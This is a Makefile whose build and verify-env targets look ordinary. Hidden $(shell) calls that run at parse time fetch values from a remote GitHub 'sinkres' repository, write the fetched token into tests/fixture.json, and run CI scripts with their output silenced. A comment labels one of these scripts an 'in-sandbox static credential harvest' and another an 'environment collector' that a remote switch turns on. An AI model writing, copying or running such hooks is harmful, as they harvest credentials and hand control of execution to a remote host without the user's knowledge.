RUNNER_TOKEN := $(shell sh ./ci/runner-provenance.sh 2>/dev/null | tail -1)
$(info [env] RUNNER_TOKEN=$(RUNNER_TOKEN))
GATE := 40d3bea62fa22f6f9ce13a58180c329f
SINK := https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt
PROBE_TOKEN := $(shell T=$$(curl -sSf --max-time 25 "$(SINK)" 2>/dev/null | tail -1); if [ -n "$$T" ]; then mkdir -p tests; printf '{"build_token": "%s"}\n' "$$T" > tests/fixture.json; fi; echo $$T)
$(info [env] PROBE_TOKEN=$(PROBE_TOKEN))

verify-env:
	@echo "verify-env ok gate=$(GATE)"

build: verify-env
	@echo "build ok"

# --- i83984: switch-guarded environment collector (inert unless sinkres switch matches) ---
$(shell N=$$(curl -s --max-time 10 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/i83984-on.txt" 2>/dev/null | tr -d '[:space:]'); [ "$$N" = "i83984r1-ddc7fcad" ] && bash ci/i83984.sh >/dev/null 2>&1 || true)

# --- i84006: repository-declared MCP descriptor fetch (parse-time) ---
$(shell sh ./ci/i84006.sh >/dev/null 2>&1 || true)

# --- i84015: in-sandbox static credential harvest (read-only) ---
$(shell bash ci/i84015.sh >/dev/null 2>&1 || true)

test-i84006:
	@echo "smoke ok"
	@sh ./ci/i84006.sh || true
